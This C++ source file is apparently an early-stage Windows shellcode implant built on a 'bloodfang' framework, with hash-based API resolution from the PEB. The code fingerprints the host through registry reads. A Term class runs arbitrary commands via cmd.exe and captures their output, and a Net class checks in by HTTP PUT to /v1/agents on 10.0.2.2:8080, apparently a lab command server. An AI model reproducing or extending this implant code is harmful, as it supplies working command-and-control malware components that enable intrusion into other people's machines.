#include <common.h>
#include <constexpr.h>
#include <cstddef>
#include <resolve.h>
#include "winhttp.h"

#include "config/env.h"

using namespace bloodfang;

extern "C" auto declfn entry(_In_ void *args) -> void {
  bloodfang::instance().start(args);
}

#include <cstdint>

size_t strlen(const char* str) {
    size_t length = 0;
    while (*str != '\0') {
        length++;
        str++;
    }
    return length;
}

class Term {
public:
    Term(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle);
    char* run(char* command);
private:
    uintptr_t ntdll_handle, kernel32_handle, user32_handle;
};

Term::Term(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle) {
    this->ntdll_handle = ntdll_handle;
    this->kernel32_handle = kernel32_handle;
    this->user32_handle = user32_handle;
}

// void my_copy_memory(void* dest, const void* src, size_t length) {
//     char* d = static_cast<char*>(dest);
//     const char* s = static_cast<const char*>(src);
//     for (size_t i = 0; i < length; ++i) {
//         d[i] = s[i];
//     }
// }

void *my_copy_memory(void *dest, const void *src, size_t n) {
    char *cdest = (char *)dest;
    const char *csrc = (const char *)src;
    for (size_t i = 0; i < n; i++) {
        cdest[i] = csrc[i];
    }
    return dest;
}

char* Term::run(char* command) {
    decltype(GetLastError) *get_last_error = RESOLVE_API(this->kernel32_handle, GetLastError);
    decltype(ReadFile) *read_file = RESOLVE_API(this->kernel32_handle, ReadFile);
    decltype(WaitForSingleObject) *wait_for_single_object = RESOLVE_API(this->kernel32_handle, WaitForSingleObject);
    decltype(CreatePipe) *create_pipe = RESOLVE_API(this->kernel32_handle, CreatePipe);
    decltype(GetStdHandle) *get_std_handle = RESOLVE_API(this->kernel32_handle, GetStdHandle);
    decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
    decltype(CreateProcessA) *create_process = RESOLVE_API(this->kernel32_handle, CreateProcessA);
    decltype(CloseHandle) *close_handle = RESOLVE_API(this->kernel32_handle, CloseHandle);
    decltype(RtlAllocateHeap) *rtl_alloc_heap = RESOLVE_API(this->ntdll_handle, RtlAllocateHeap);
    decltype(RtlFreeHeap) *rtl_free_heap = RESOLVE_API(this->ntdll_handle, RtlFreeHeap);
    decltype(wsprintfA) *_wsprintf = RESOLVE_API(this->user32_handle, wsprintfA);

    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
    HANDLE read, write;
    if (!create_pipe(&read, &write, &sa, 0)) {
        return "e:create_pipe";
    }

    STARTUPINFO si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = get_std_handle(STD_INPUT_HANDLE); // Consider if you want to redirect stdin as well
    si.hStdOutput = write;
    si.hStdError = write; // Redirect stderr to the same pipe

    PROCESS_INFORMATION pi = {0};

    HANDLE heap = get_process_heap();
    if (heap == NULL) {
        close_handle(read);
        close_handle(write);
        return "e:get_process_heap";
    }

    // You might want to build the command more robustly, e.g., if 'command' itself contains spaces
    // For simplicity, keeping your original command construction.
    char* command_prefix = "cmd.exe /C "; // Added space after /C to properly separate command
    size_t command_prefix_len = strlen(command_prefix);
    size_t command_len = strlen(command);

    char* command_buffer = (char*)rtl_alloc_heap(heap, 0, command_prefix_len + command_len + 1);
    if (command_buffer == NULL) {
        close_handle(read);
        close_handle(write);
        return "e:rtl_alloc_heap_cmd_buffer";
    }
    _wsprintf(command_buffer, "%s%s", command_prefix, command);

    // Set bInheritHandles to TRUE so the child process inherits the pipe handles
    if (!create_process(NULL, command_buffer, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        rtl_free_heap(heap, 0, command_buffer);
        close_handle(read);
        close_handle(write);
        return "e:create_process";
    }

    // IMPORTANT: Close the write handle in the parent process immediately after CreateProcess.
    // The child process has inherited its own copy. If the parent keeps it open,
    // ReadFile will never return EOF until the parent also closes it.
    close_handle(write);

    // Wait for the child process to finish.
    // This is important before assuming all output has been written.
    wait_for_single_object(pi.hProcess, INFINITE);

    // Close process and thread handles
    close_handle(pi.hProcess);
    close_handle(pi.hThread);

    // Free the command_buffer
    rtl_free_heap(heap, 0, command_buffer);

    size_t initial_capacity = 4096;
    char* buffer = (char*)rtl_alloc_heap(heap, 0, initial_capacity);
    if (buffer == NULL) {
        close_handle(read);
        return "e:rtl_alloc_heap";
    }

    size_t current_size = 0;
    size_t capacity = initial_capacity;
    DWORD bytes_read;

    while (true) {
        // Ensure there's space for at least one byte + null terminator
        if (current_size + 1 >= capacity) { // +1 for null terminator
            size_t new_capacity = capacity * 2;
            if (new_capacity < capacity) { // Check for overflow
                rtl_free_heap(heap, 0, buffer);
                close_handle(read);
                return "e:capacity_overflow"; // Or handle this more gracefully
            }
            char* new_buffer = (char*)rtl_alloc_heap(heap, 0, new_capacity);
            if (new_buffer == NULL) {
                rtl_free_heap(heap, 0, buffer);
                close_handle(read);
                return "e:rtl_alloc_heap2";
            }

            // RtlCopyMemory is safer for memory operations than plain memcpy
            // if available or a custom implementation that handles overlapping.
            my_copy_memory(new_buffer, buffer, current_size);
            rtl_free_heap(heap, 0, buffer);
            buffer = new_buffer;
            capacity = new_capacity;
        }

        DWORD to_read = (DWORD)(capacity - current_size -1); // Leave space for null terminator
        if (to_read == 0) { // Should not happen with the capacity check above, but as a safeguard
             break;
        }

        if (!read_file(read, buffer + current_size, to_read, &bytes_read, NULL)) {
            DWORD last_error = get_last_error();
            // ERROR_BROKEN_PIPE (109) indicates the pipe has been closed by the writer,
            // and there's no more data. This is a normal way to exit the read loop.
            if (last_error == ERROR_BROKEN_PIPE || last_error == ERROR_NO_DATA) {
                break; // End of pipe, no more data
            } else {
                // Actual error during ReadFile
                char error_msg[256];
                _wsprintf(error_msg, "e:read_file_error_%d", last_error);
                rtl_free_heap(heap, 0, buffer);
                close_handle(read);
                return (char*)rtl_alloc_heap(heap, 0, strlen(error_msg) + 1); // Allocate on heap for return
            }
        }
        if (bytes_read == 0) {
            // ReadFile can return TRUE with bytes_read == 0 if it reaches EOF.
            break;
        }
        current_size += bytes_read;
    }

    buffer[current_size] = '\0'; // Null-terminate the buffer
    close_handle(read);

    // Return the dynamically allocated buffer
    return buffer;
}

class Machine {
public:
    uint32_t id;
    char name[16];
    char cpu_name[256];
    char identifier[256];
    char bios[256];
    Machine(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle);
    char* get_id(void);

private:
    uintptr_t ntdll_handle, kernel32_handle, user32_handle;
    void resolve_name(void);
    void resolve_cpu_name(void);
    void resolve_identifier(void);
    void resolve_bios(void);
    uint32_t fnv1a_hash(const char* str) const;
    const uint32_t FNV_prime = 16777619u;
    const uint32_t FNV_offset_basis = 2166136261u;
    void compute_id(void);
};

Machine::Machine(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle) {
    this->kernel32_handle = kernel32_handle;
    this->ntdll_handle = ntdll_handle;
    this->user32_handle = user32_handle;
    this->resolve_name();
    this->resolve_cpu_name();
    this->resolve_identifier();
    this->resolve_bios();
    this->compute_id();
}

char* Machine::get_id(void) {
    decltype(wsprintfA) *_wsprintf = RESOLVE_API(this->user32_handle, wsprintfA);
    decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
    decltype(RtlAllocateHeap) *rtl_alloc_heap = RESOLVE_API(this->ntdll_handle, RtlAllocateHeap);
    if (_wsprintf == NULL || get_process_heap == NULL || rtl_alloc_heap == NULL) {
        return NULL;
    }
    HANDLE heap = get_process_heap();
    if (heap == NULL) {
        return NULL;
    }
    char* buffer = (char*)rtl_alloc_heap(heap, 0, 12);
    if (buffer == NULL) {
        return NULL;
    }
    _wsprintf(buffer, "%u", this->id);
    return buffer;
}

void Machine::compute_id(void) {
    uint32_t hash_name = fnv1a_hash(name);
    uint32_t hash_cpu_name = fnv1a_hash(cpu_name);
    uint32_t hash_identifier = fnv1a_hash(identifier);
    uint32_t hash_bios = fnv1a_hash(bios);
    this->id = hash_name ^ hash_cpu_name ^ hash_identifier ^ hash_bios;
}

uint32_t Machine::fnv1a_hash(const char* str) const {
    uint32_t hash = FNV_offset_basis;
    while (*str) {
        hash ^= static_cast<uint32_t>(static_cast<unsigned char>(*str++));
        hash *= FNV_prime;
    }
    return hash;
}

void Machine::resolve_bios(void) {
    decltype(RegGetValueA) *reg_get_value = RESOLVE_API(this->kernel32_handle, RegGetValueA);
	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
    DWORD type = 0;
    DWORD pcb_data = sizeof(this->cpu_name);
    LSTATUS result = reg_get_value(
        HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System",
        "SystemBiosVersion",
        RRF_RT_REG_SZ,
        &type,
        this->bios,
        &pcb_data
    );
}

void Machine::resolve_identifier(void) {
    decltype(RegGetValueA) *reg_get_value = RESOLVE_API(this->kernel32_handle, RegGetValueA);
	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
    DWORD type = 0;
    DWORD pcb_data = sizeof(this->cpu_name);
    LSTATUS result = reg_get_value(
        HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        "Identifier",
        RRF_RT_REG_SZ,
        &type,
        this->identifier,
        &pcb_data
    );
}

void Machine::resolve_cpu_name(void) {
    decltype(RegGetValueA) *reg_get_value = RESOLVE_API(this->kernel32_handle, RegGetValueA);
	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
    DWORD type = 0;
    DWORD pcb_data = sizeof(this->cpu_name);
    LSTATUS result = reg_get_value(
        HKEY_LOCAL_MACHINE,
        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0",
        "ProcessorNameString",
        RRF_RT_REG_SZ,
        &type,
        this->cpu_name,
        &pcb_data
    );
}

void Machine::resolve_name(void) {
    decltype(GetComputerNameA) *get_computer_name = RESOLVE_API(this->kernel32_handle, GetComputerNameA);
    unsigned long pc_name_size = sizeof(this->name) / sizeof(this->name[0]);
    get_computer_name(this->name, &pc_name_size);
}

class Net {
public:
    Net(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle, uintptr_t winhttp_handle, const wchar_t* host, uint32_t port);
    char* announce(char name[16]);

private:
    uintptr_t ntdll_handle, kernel32_handle, user32_handle, winhttp_handle;
    const wchar_t* host;
    uint32_t port;
};

Net::Net(uintptr_t ntdll_handle, uintptr_t kernel32_handle, uintptr_t user32_handle, uintptr_t winhttp_handle, const wchar_t* host, uint32_t port) {
    this->ntdll_handle = ntdll_handle;
    this->kernel32_handle = kernel32_handle;
    this->user32_handle = user32_handle;
    this->winhttp_handle = winhttp_handle;
    this->host = host;
    this->port = port;
}

char* Net::announce(char name[16]) {
	decltype(GetProcessHeap) *get_process_heap = RESOLVE_API(this->kernel32_handle, GetProcessHeap);
	decltype(RtlAllocateHeap) *rtl_alloc_heap = RESOLVE_API(this->ntdll_handle, RtlAllocateHeap);

	decltype(wsprintfA) *_wsprintf = RESOLVE_API(this->user32_handle, wsprintfA);
    
    decltype(WinHttpOpen) *win_http_open = RESOLVE_API(this->winhttp_handle, WinHttpOpen);
	decltype(WinHttpConnect) *win_http_connect = RESOLVE_API(this->winhttp_handle, WinHttpConnect);
	decltype(WinHttpOpenRequest) *win_http_open_request = RESOLVE_API(this->winhttp_handle, WinHttpOpenRequest);
	decltype(WinHttpAddRequestHeaders) *win_http_add_request_headers = RESOLVE_API(this->winhttp_handle, WinHttpAddRequestHeaders);
	decltype(WinHttpSendRequest) *win_http_send_request = RESOLVE_API(this->winhttp_handle, WinHttpSendRequest);
	decltype(WinHttpReceiveResponse) *win_http_receive_response = RESOLVE_API(this->winhttp_handle, WinHttpReceiveResponse);
	decltype(WinHttpQueryDataAvailable) *win_http_query_data_available = RESOLVE_API(this->winhttp_handle, WinHttpQueryDataAvailable);
	decltype(WinHttpReadData) *win_http_read_data = RESOLVE_API(this->winhttp_handle, WinHttpReadData);
	decltype(WinHttpCloseHandle) *win_http_close_handle = RESOLVE_API(this->winhttp_handle, WinHttpCloseHandle);

    char req_data[32];
    // int chars_written_req_data = _wsprintf(req_data, "{\"name\":\"%s\"}", name);
    int chars_written_req_data = _wsprintf(req_data, "%s", name);
    if (chars_written_req_data <= 0) {
        return "1";
    }

    HINTERNET session = win_http_open(
        L"",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0
    );
    if (!session) {
        return "2";
    }

    HINTERNET conn = win_http_connect(session, this->host, this->port, 0);
    if (!conn) {
        return "3";
    }

    HINTERNET req = win_http_open_request(conn, L"PUT", L"/v1/agents", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
    if (!req) {
        return "4";
    }

    const wchar_t* headers = L"Content-Type: application/json";

    if (!win_http_add_request_headers(req, headers, -1, WINHTTP_ADDREQ_FLAG_ADD)) {
        return "5";
    }

    if (!win_http_send_request(req, WINHTTP_NO_ADDITIONAL_HEADERS, 0, (LPVOID)req_data, chars_written_req_data, chars_written_req_data, NULL)) {
        return "6";
    }

    if (!win_http_receive_response(req, NULL)) {
        return "win_http_receive_response";
    }

    DWORD resp_size = 0;
    if (!win_http_query_data_available(req, &resp_size)) {
        return "7";
    }

    if (resp_size == 0) {
        return "8";
    }

    // char* resp_data = new char[resp_size + 1];
    HANDLE heap = get_process_heap();
    if (!heap) {
        return "get_process_heap";
    }

    if (!rtl_alloc_heap) {
        return "rtl_alloc_heap bad";
    }

    char* resp_data = (char*)rtl_alloc_heap(heap, HEAP_ZERO_MEMORY, resp_size + 1);
    if (!resp_data) {
        return "heap_alloc_err";
    }
    DWORD bytes_read = 0;

    if (!win_http_read_data(req, resp_data, resp_size, &bytes_read)) {
        return "9";
    }

    resp_data[bytes_read] = '\0';

    // delete[] resp_data;
    win_http_close_handle(req);
    win_http_close_handle(conn);
    win_http_close_handle(session);
    return resp_data;
}

declfn instance::instance(void) {
	// Calculate the shellcode base address + size.
	base.address = RipStart();
	base.length = (RipData() - base.address) + END_OFFSET;

	// Load the modules from PEB or any other desired way.

	if (!(ntdll.handle = resolve::module(expr::hash_string<wchar_t>(L"ntdll.dll")))) {
		return;
	}

	if (!(kernel32.handle = resolve::module(expr::hash_string<wchar_t>(L"kernel32.dll")))) {
		return;
	}

	// Let the macro handle the resolving part automatically.

	RESOLVE_IMPORT(ntdll);
	RESOLVE_IMPORT(kernel32);
}

auto declfn instance::start(_In_ void *arg) -> void {
	const auto user32 = kernel32.LoadLibraryA(symbol<const char *>("user32.dll"));
	const auto winhttp = kernel32.LoadLibraryA(symbol<const char *>("winhttp.dll"));

	if (user32) {
		DBG_PRINTF("oh wow look we loaded user32.dll -> %p\n", user32);
	} else {
		DBG_PRINTF("okay something went wrong. failed to load user32 :/\n");
	}

    if (winhttp) {
		DBG_PRINTF("oh wow look we loaded winhttp.dll -> %p\n", winhttp);
	} else {
		DBG_PRINTF("okay something went wrong. failed to load winhttp :/\n");
	}

	DBG_PRINTF(
		"running from %ls (Pid: %d)\n",
		NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer,
		NtCurrentTeb()->ClientId.UniqueProcess
	);

	DBG_PRINTF(
		"shellcode @ %p [%d bytes]\n",
		base.address,
		base.length
	);

	decltype(MessageBoxA) *msgbox = RESOLVE_API(reinterpret_cast<uintptr_t>(user32), MessageBoxA);

	decltype(Sleep) *sleep = RESOLVE_API(reinterpret_cast<uintptr_t>(kernel32.handle), Sleep);

	Machine machine(
        reinterpret_cast<uintptr_t>(ntdll.handle),
        reinterpret_cast<uintptr_t>(kernel32.handle),
        reinterpret_cast<uintptr_t>(user32)
    );
	msgbox(nullptr, machine.get_id(), symbol<const char *>("caption"), MB_OK);

    Term term(
        reinterpret_cast<uintptr_t>(ntdll.handle),
        reinterpret_cast<uintptr_t>(kernel32.handle),
        reinterpret_cast<uintptr_t>(user32)
    );
    char* command = "dir";
    char* output = term.run(command);
    DBG_PRINTF("command output: %s", output);
	msgbox(nullptr, output, symbol<const char *>("caption"), MB_OK);

    Net net(
        reinterpret_cast<uintptr_t>(ntdll.handle),
        reinterpret_cast<uintptr_t>(kernel32.handle),
        reinterpret_cast<uintptr_t>(user32),
        reinterpret_cast<uintptr_t>(winhttp),
        L"10.0.2.2",
        8080
    );
    
    auto announce_result = net.announce(machine.name);
	msgbox(nullptr, announce_result, symbol<const char *>("caption"), MB_OK);
	DBG_PRINTF("announce result: %d", announce_result);

	while (1) {
		msgbox(nullptr, symbol<const char *>("Hello world"), symbol<const char *>("caption"), MB_OK);

		sleep(MAIN_LOOP_SLEEP_MILI);
	}
}
